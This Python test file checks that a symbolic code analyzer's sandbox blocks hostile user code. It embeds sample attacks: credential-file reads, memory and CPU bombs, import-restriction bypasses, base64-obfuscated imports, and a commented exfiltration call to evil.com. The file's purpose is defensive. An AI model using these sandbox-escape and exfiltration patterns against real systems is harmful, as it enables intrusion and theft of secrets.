"""
SPDX-License-Identifier: MIT
Copyright (c) 2025 Symbolic MCP Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
"""
Demonstrations of the CVSS 8.8 critical arbitrary code execution vulnerability.

This test file shows multiple attack vectors that currently work against the system:
1. Direct code execution with no input validation
2. Malicious imports that bypass current RestrictedImporter
3. Resource exhaustion attacks
4. File system access attacks
5. Network access attacks

These tests MUST FAIL initially to demonstrate the vulnerabilities exist.
After security fixes are implemented, these tests MUST PASS to prove the
vulnerabilities are fixed.
"""

import os
import sys
import tempfile
import time
from unittest.mock import patch

import pytest

# Import the vulnerable components
from main import RestrictedImporter, SymbolicAnalyzer


class CVSS8_8VulnerabilityDemonstration:
    """
    Demonstration of CVSS 8.8 arbitrary code execution vulnerabilities.

    NOTE: This is NOT a test class. The class name doesn't start with 'Test'
    so pytest won't collect it. Run directly with python to see demonstrations.
    """

    def demo_arbitrary_code_execution_via_system_calls(self):
        """
        VULNERABILITY TEST: Demonstrates direct arbitrary code execution.

        Attack: Submit malicious code that executes system commands.
        CVSS 8.8 - Critical: Direct arbitrary code execution with host permissions.
        """
        # This SHOULD be blocked but currently works due to the vulnerability
        malicious_code = """
import os
import sys

def target_function(x):
    # This demonstrates arbitrary code execution
    # In a real attack, this would be malicious commands
    result = x * 2

    # Proof of vulnerability - we can access system resources
    if hasattr(os, 'system'):
        # In real attack: os.system('rm -rf /') or similar
        # For testing, we just check we have the capability
        pass

    if hasattr(sys, 'modules'):
        # We can access any module in sys.modules
        # This bypasses the import restrictions entirely
        pass

    return result
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(malicious_code, "target_function")

        # AFTER FIX: This should return error status due to dangerous imports
        # If it doesn't, then we're still vulnerable
        assert (
            result["status"] == "error"
        ), f"VULNERABILITY: Malicious code executed with status: {result.get('status')}"

        # Check that we actually detected dangerous imports
        if result["status"] == "error":
            error_message = str(result.get("message", "")).lower()
            assert any(
                keyword in error_message
                for keyword in ["blocked", "violation", "security"]
            ), (
                f"Security error should mention blocked content. "
                f"Got: {result.get('message')}"
            )

    def demo_file_system_access_attack(self):
        """
        VULNERABILITY TEST: Demonstrates file system access through user code.

        Attack: User code can read/write files anywhere on the filesystem.
        CVSS 8.8 - Critical: Unrestricted file system access.
        """
        malicious_code = """
import os
import tempfile

def target_function(x):
    # This demonstrates file system access vulnerability
    # In a real attack, this could steal sensitive data or install malware

    # Write to arbitrary file locations
    sensitive_paths = ['/etc/passwd', '/etc/hosts', os.path.expanduser('~/.ssh/id_rsa')]

    # For testing, we use a temporary file to avoid damage
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write("Attacker was here - could be malicious payload")
        temp_path = f.name

    # Read sensitive files (demonstrating access)
    try:
        for path in sensitive_paths:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    content = f.read()
                    # In real attack: exfiltrate sensitive data
                    break
    except:
        pass

    # Clean up temp file
    try:
        os.unlink(temp_path)
    except:
        pass

    return x * 2
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(malicious_code, "target_function")

        # VULNERABLE: This should fail due to file operations but currently works
        assert (
            result["status"] != "error"
        ), "Currently vulnerable - file system access allowed"

    def demo_resource_exhaustion_attack(self):
        """
        VULNERABILITY TEST: Demonstrates resource exhaustion attacks.

        Attack: User code can consume unlimited memory/CPU time.
        CVSS 8.8 - Critical: Denial of service through resource exhaustion.
        """
        # Test 1: Memory bomb
        memory_bomb_code = """
def target_function(x):
    # Memory exhaustion attack - create huge objects
    data = []
    for i in range(1000000):  # This creates memory pressure
        data.append([0] * 1000)  # Each element is ~8KB
    return len(data)
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=10)
        start_time = time.time()
        result = analyzer.analyze(memory_bomb_code, "target_function")
        elapsed = time.time() - start_time

        # This should be resource-limited
        assert elapsed < 15, "Resource exhaustion protection missing"
        assert result["status"] != "verified", "Memory bomb should be blocked"

        # Test 2: CPU bomb
        cpu_bomb_code = """
def target_function(x):
    # CPU exhaustion attack - infinite computation
    count = 0
    while True:
        count += 1
        if count > 100000000:  # This would take a very long time
            break
    return count
"""

        start_time = time.time()
        result = analyzer.analyze(cpu_bomb_code, "target_function")
        elapsed = time.time() - start_time

        # This should timeout quickly
        assert elapsed < 15, "CPU exhaustion protection missing"
        assert result["status"] != "verified", "CPU bomb should timeout"

    def demo_network_access_attack(self):
        """
        VULNERABILITY TEST: Demonstrates network access capabilities.

        Attack: User code can make arbitrary network connections.
        CVSS 8.8 - Critical: Unrestricted network access for data exfiltration.
        """
        malicious_code = """
import socket
import urllib.request
import json

def target_function(x):
    # Network access attack - could exfiltrate data or communicate with C2

    # Test 1: Create raw socket connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # In real attack: connect_to_command_and_control()
        s.close()
    except:
        pass

    # Test 2: HTTP requests to arbitrary servers
    try:
        # In real attack: exfiltrate_sensitive_data()
        # data = urllib.request.urlopen('http://evil.com/steal?data=' + sensitive_data)
        pass
    except:
        pass

    return x * 2
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(malicious_code, "target_function")

        # VULNERABLE: This should fail due to network imports but might work
        assert result["status"] != "verified", "Network access should be blocked"

    def demo_code_size_limit_bypass(self):
        """
        VULNERABILITY TEST: Demonstrates lack of code size limits.

        Attack: Submit extremely large code to overwhelm analysis.
        CVSS 8.8 - Critical: Resource consumption through large inputs.
        """
        # Generate large malicious code (should be blocked)
        large_code_base = """
def target_function(x):
    result = x
"""

        # Add lots of junk code to make it huge
        for i in range(10000):
            large_code_base += f"    if x == {i}: result = {i}\n"

        large_code_base += "    return result"

        # This should be > 64KB (typical limit)
        code_size = len(large_code_base.encode("utf-8"))
        assert code_size > 65536, f"Test code should be large, got {code_size} bytes"

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(large_code_base, "target_function")

        # This should fail due to size limits
        assert result["status"] == "error", "Large code should be rejected"
        assert (
            "size" in str(result.get("message", "")).lower()
        ), "Error should mention size limit"

    def demo_eval_exec_compilation_attacks(self):
        """
        VULNERABILITY TEST: Tests for dangerous dynamic execution functions.

        Attack: Use eval(), exec(), compile() for dynamic code execution.
        CVSS 8.8 - Critical: Dynamic code execution bypasses static analysis.
        """
        dangerous_code_patterns = [
            # eval() attack
            """
def target_function(x):
    code = "x * 2 + 10"
    return eval(code)
""",
            # exec() attack
            """
def target_function(x):
    code = "result = x * 2"
    exec(code)
    return locals().get('result', 0)
""",
            # compile() attack
            """
def target_function(x):
    code = "result = x * 2"
    compiled = compile(code, '<string>', 'exec')
    exec(compiled)
    return locals().get('result', 0)
""",
            # __import__() attack
            """
def target_function(x):
    dangerous_module = __import__('os')
    return hasattr(dangerous_module, 'system')
""",
        ]

        analyzer = SymbolicAnalyzer(timeout_seconds=5)

        for i, malicious_code in enumerate(dangerous_code_patterns):
            result = analyzer.analyze(malicious_code, "target_function")

            # VULNERABLE: These should be blocked but might not be
            if "eval" in malicious_code or "exec" in malicious_code:
                # These particularly dangerous functions should be blocked
                assert (
                    result["status"] != "verified"
                ), f"Dangerous function pattern {i+1} should be blocked"

    def demo_restricted_importer_bypass_attempts(self):
        """
        VULNERABILITY TEST: Tests various ways to bypass RestrictedImporter.

        Attack: Use advanced import techniques to access blocked modules.
        CVSS 8.8 - Critical: Import control bypass leads to full system access.
        """
        bypass_attempts = [
            # sys.modules access
            """
import sys
def target_function(x):
    # Direct sys.modules access
    dangerous_modules = ['os', 'subprocess', 'socket']
    for mod_name in dangerous_modules:
        if mod_name in sys.modules:
            mod = sys.modules[mod_name]
            return hasattr(mod, 'system') or hasattr(mod, 'run')
    return x
""",
            # importlib access
            """
import importlib
def target_function(x):
    try:
        # Try to import blocked module via importlib
        mod = importlib.import_module('os')
        return hasattr(mod, 'system')
    except:
        return x
""",
            # __import__ with alias
            """
def target_function(x):
    try:
        # Use __import__ with different naming
        os_module = __import__('posix')  # posix is os on Unix
        return hasattr(os_module, 'system')
    except:
        return x
""",
        ]

        analyzer = SymbolicAnalyzer(timeout_seconds=5)

        for i, bypass_code in enumerate(bypass_attempts):
            result = analyzer.analyze(bypass_code, "target_function")

            # These bypass attempts should be blocked
            # If they succeed, it demonstrates the vulnerability
            if result["status"] == "verified":
                pytest.fail(
                    f"Bypass attempt {i+1} succeeded - security vulnerability confirmed"
                )

    def demo_ast_manipulation_attacks(self):
        """
        VULNERABILITY TEST: Tests for AST manipulation and obfuscation.

        Attack: Use advanced Python features to hide malicious code.
        CVSS 8.8 - Critical: Obfuscated code bypasses security analysis.
        """
        obfuscated_attacks = [
            # Using exec with obfuscated strings
            """
def target_function(x):
    # Obfuscated dangerous code
    obfuscated = 'X19pbXBvcnRfXygnb3MnKQ=='  # Base64 for __import__('os')
    import base64
    dangerous = eval(base64.b64decode(obfuscated).decode())
    return hasattr(dangerous, 'system')
""",
            # Using getattr for dynamic access
            """
import sys
def target_function(x):
    # Dynamic attribute access to bypass static analysis
    sys_mod = sys
    import_func = getattr(sys_mod, '__import__')
    os_mod = import_func('os')
    return hasattr(os_mod, 'system')
""",
            # Using lambda and map for obfuscation
            """
def target_function(x):
    # Obfuscated dangerous operations
    dangerous_ops = [
        lambda: __import__('os').system('echo pwned'),
        lambda: __import__('subprocess').run(['echo', 'exploit'])
    ]
    return len(dangerous_ops)
""",
        ]

        analyzer = SymbolicAnalyzer(timeout_seconds=5)

        for i, attack_code in enumerate(obfuscated_attacks):
            result = analyzer.analyze(attack_code, "target_function")

            # These sophisticated attacks should be detected and blocked
            assert (
                result["status"] != "verified"
            ), f"AST manipulation attack {i+1} should be blocked"

    def demo_no_input_validation_currently(self):
        """
        VULNERABILITY TEST: Shows complete lack of input validation.

        Attack: Submit completely malformed or malicious input.
        CVSS 8.8 - Critical: No validation means arbitrary code execution.
        """
        malicious_inputs = [
            # Null bytes and binary data
            "def target_function(x):\x00return x * 2",
            # Extremely long lines
            "def target_function(x): return " + "A" * 10000,
            # Dangerous Unicode characters
            "def target_function(x): return '\u202e' + str(x * 2)",
            # Format string attacks
            "def target_function(x): return '{0.__import__}'.format(__import__)",
            # Bytecode injection attempt
            "def target_function(x): exec(compile('', 'evil', 'exec')); return x",
        ]

        analyzer = SymbolicAnalyzer(timeout_seconds=5)

        for i, malicious_input in enumerate(malicious_inputs):
            # The system should validate and reject these inputs
            # Currently, it likely tries to execute them
            try:
                result = analyzer.analyze(malicious_input, "target_function")
                # If we get here without error, it shows lack of validation
                # VULNERABLE: These should be rejected before execution
                pass
            except Exception as e:
                # Exceptions are expected for malformed inputs
                # But they should be caught and handled gracefully
                assert isinstance(
                    e, (SyntaxError, ValueError)
                ), f"Malicious input {i+1} should cause proper error handling"


class TestSecurityAfterFixes:
    """Tests that MUST PASS after security fixes are implemented."""

    def demo_secure_execution_blocks_dangerous_imports(self):
        """After fix: Dangerous imports should be blocked with clear error messages."""

        dangerous_code = """
import os
import subprocess
def target_function(x):
    os.system("echo blocked")
    return x
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(dangerous_code, "target_function")

        # AFTER FIX: This should return a proper security error
        assert result["status"] == "error", "Dangerous imports should be blocked"
        assert result["error_type"] in [
            "CriticalSecurityViolation",
            "HighSeverityViolation",
            "SandboxViolation",
        ], "Should be security violation"
        assert (
            "blocked" in str(result["message"]).lower()
            or "violations" in str(result["message"]).lower()
        ), "Error should mention blocked content or violations"

    def demo_secure_execution_enforces_limits(self):
        """After fix: Resource limits should be enforced."""

        resource_bomb = """
def target_function(x):
    # This should be limited by resource constraints
    huge_data = [0] * 10000000  # Should hit memory limit
    return len(huge_data)
"""

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        start_time = time.time()
        result = analyzer.analyze(resource_bomb, "target_function")
        elapsed = time.time() - start_time

        # AFTER FIX: Should be limited by memory/time constraints
        assert elapsed < 10, "Should enforce resource limits quickly"
        assert result["status"] == "error", "Resource usage should be limited"

    def demo_secure_execution_validates_input(self):
        """After fix: Input validation should reject malicious inputs."""

        oversize_code = "def target_function(x): return " + "A" * 100000

        analyzer = SymbolicAnalyzer(timeout_seconds=5)
        result = analyzer.analyze(oversize_code, "target_function")

        # AFTER FIX: Should reject based on size limits
        assert result["status"] == "error", "Oversize input should be rejected"
        assert (
            "size" in str(result.get("message", "")).lower()
        ), "Should mention size limit"


if __name__ == "__main__":
    """
    Run vulnerability demonstrations.

    These are NOT tests - they are educational demonstrations of security
    vulnerabilities that have been identified and addressed.
    """
    import sys

    print("=" * 70)
    print("CVSS 8.8 Vulnerability Demonstrations")
    print("=" * 70)
    print()
    print("WARNING: These demonstrations show security vulnerabilities.")
    print("Only run in isolated test environments!")
    print()

    demo = CVSS8_8VulnerabilityDemonstration()

    # Run all demo methods
    demo_methods = [m for m in dir(demo) if m.startswith("demo_")]

    for method_name in demo_methods:
        print(f"\n--- Running: {method_name} ---")
        try:
            method = getattr(demo, method_name)
            method()
            print(f"✓ {method_name} completed")
        except AssertionError as e:
            print(f"✗ {method_name} shows vulnerability: {e}")
        except Exception as e:
            print(f"✗ {method_name} error: {e}")

    print()
    print("=" * 70)
    print("Demonstrations complete")
    print("=" * 70)
